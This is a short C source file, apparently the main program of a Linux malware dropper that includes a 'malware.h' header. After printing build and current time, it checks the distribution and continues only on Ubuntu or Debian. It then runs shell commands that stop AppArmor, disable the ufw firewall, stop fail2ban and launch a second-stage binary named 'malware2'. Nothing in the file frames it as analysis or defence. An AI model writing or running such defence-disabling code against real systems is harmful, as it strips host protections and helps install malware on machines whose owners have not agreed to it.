#include <time.h>
#include "malware.h"

// Disable security

int main(int argc, char **argv) {
	init(argv[0]);

	time_t now;
	time(&now);
	struct tm *local = localtime(&now);
	
	printf("Build date: %s\n", __DATE__);
	printf("Build time: %s\n\n", __TIME__);

	printf("Current date: %s", ctime(&now));
	printf("Current time: %02d:%02d:%02d\n", local->tm_hour, local->tm_min, local->tm_sec);


// Check distro

init_distro();
switch (distro) {
	case UBUNTU:
		printf("Distro Ubuntu detected\n");
		break;
	case CENTOS:
		printf("Sorry, distro CentOS is not supported yet\n");
		return EXIT_FAILURE;
	case AMI2:
		printf("Sorry, distro AMI2 is not supported yet\n");
		return EXIT_FAILURE;
	case REDHAT:
		printf("Sorry, distro Red Hat is not supported yet\n");
		return EXIT_FAILURE;
	case DEBIAN:
		printf("Distro Debian, not tested, but should work....\n");
		break;
	default:
		printf("Sorry, this unknown is not supported yet\n");
		return EXIT_FAILURE;
}

// TODO : remove
// return 0;

	// Disable security
	log_exec("Disable AppArmor",
	"systemctl stop apparmor");

	log_exec("Disable firewall ufw",
	"ufw disable");

	log_exec("Stop fail2ban",
	"service fail2ban stop");

	log_exec("Launch malware2",
	"./malware2");
	
	return EXIT_SUCCESS;
}
